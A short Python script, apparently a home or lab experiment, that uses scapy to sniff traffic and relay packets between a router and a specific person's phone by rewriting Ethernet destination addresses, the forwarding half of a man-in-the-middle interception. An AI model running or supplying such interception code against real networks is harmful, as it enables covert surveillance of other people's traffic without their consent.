from scapy import packet
from constants import (
    WIFI_INTERFACE,
    ROUTER_MAC,
    CAMERA_MAC,
    IVAN_PHONE_MAC,
    MITKO_PHONE_MAC,
    IVAN_PHONE_HOME_MAC,
    ROUTER_HOME_MAC,
)
from utils import get_ip_from_mac, get_my_mac
from scapy.sendrecv import sniff
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.sendrecv import send, sendp

IPHONE_IP = get_ip_from_mac(IVAN_PHONE_MAC)
MY_MAC = get_my_mac()
print(f"my mac is {MY_MAC}")
print(f"Iphone ip is {IPHONE_IP}")


def dropping_callback(packet):
    if (
        IP in packet
        and packet[IP].src == IPHONE_IP
        and packet[Ether].dst == MY_MAC.lower()
    ):
        packet[Ether].dst = ROUTER_MAC.lower()
        sendp(packet, verbose=False)
        print("Caught packet")
    elif (
        IP in packet
        and packet[IP].dst == IPHONE_IP
        and packet[Ether].dst == MY_MAC.lower()
    ):
        print("Return")
        packet[Ether].dst = IVAN_PHONE_MAC.lower()
        sendp(packet, verbose=False)
        packet.show()


sniff(prn=dropping_callback)
